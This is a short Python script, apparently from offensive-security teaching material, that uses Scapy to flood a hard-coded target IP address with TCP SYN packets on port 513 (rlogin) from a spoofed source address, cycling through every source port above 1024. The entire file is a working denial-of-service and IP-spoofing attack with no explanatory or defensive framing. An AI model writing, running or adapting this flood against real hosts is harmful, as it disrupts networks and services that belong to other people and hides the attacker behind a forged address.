from scapy.all import *

def synFlood(src, tgt):
    for sport in range(1024, 65535):
        IPlayer = IP(src=src, dst=tgt)
        TCPlayer = TCP(sport=sport, dport=513)
        pkt = IPlayer / TCPlayer
        send(pkt)

if __name__ == "__main__":
    src = '119.188.97.19'
    tgt = '119.188.97.198'
    synFlood(src, tgt)
